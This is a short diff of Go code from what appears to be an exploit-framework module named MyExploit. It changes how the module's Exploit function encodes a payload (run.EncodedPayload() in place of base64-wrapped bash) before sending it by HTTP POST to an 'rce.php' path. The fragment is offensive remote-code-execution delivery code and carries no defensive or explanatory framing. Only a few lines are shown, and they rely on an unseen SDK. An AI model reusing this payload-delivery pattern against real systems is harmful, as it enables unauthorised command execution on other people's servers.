@@ -43,7 +43,7 @@ func (m *MyExploit) Check(run *sdk.Context) (sdk.CheckResult, error) {
 }
 
 func (m *MyExploit) Exploit(run *sdk.Context) error {
-	cmd := run.CommentTrail(run.Base64Bash(run.Payload()))
+	cmd := run.CommentTrail(run.EncodedPayload())
 	_, err := run.Send(sdk.HTTPRequest{
 		Method: "POST",
 		Path:   "rce.php",
